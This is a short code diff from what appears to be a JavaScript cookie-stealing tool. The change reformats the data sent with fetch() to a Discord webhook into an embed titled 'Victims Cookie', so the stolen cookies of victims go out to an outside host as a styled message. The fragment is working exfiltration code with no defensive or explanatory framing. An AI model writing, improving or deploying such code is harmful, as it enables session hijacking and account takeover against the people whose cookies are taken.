@@ -53,13 +53,23 @@
         return;
       }
 
-      // Send the message to Discord webhook
+      // Create the embed payload
+      const embedPayload = {
+        embeds: [
+          {
+            title: "Victims Cookie", // Embed title
+            description: message, // Embed description
+            color: 16711680, // Embed color (red in this case)
+            timestamp: new Date().toISOString() // Adds a timestamp
+          }
+        ]
+      };
+
+      // Send the embed to Discord webhook
       fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          content: message,
-        }),
+        body: JSON.stringify(embedPayload),
       })
         .then((response) => {
           if (response.ok) {
